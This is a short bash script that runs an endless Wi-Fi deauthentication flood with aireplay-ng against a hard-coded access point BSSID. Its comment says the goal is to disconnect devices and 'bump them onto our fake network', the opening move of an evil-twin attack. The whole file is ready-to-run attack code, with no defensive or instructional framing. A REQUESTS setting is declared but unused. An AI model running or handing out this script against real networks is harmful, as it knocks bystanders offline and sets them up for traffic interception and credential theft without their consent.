#! /bin/bash

# disconnect devices and bump them onto our fake network

BSSID=20:4E:7F:00:6D:E2
INTERFACE=wlan1mon
REQUESTS=0	# 0 = infinite, else > 0 is limited

aireplay-ng --deauth 0 -a $BSSID $INTERFACE --ignore-negative-one
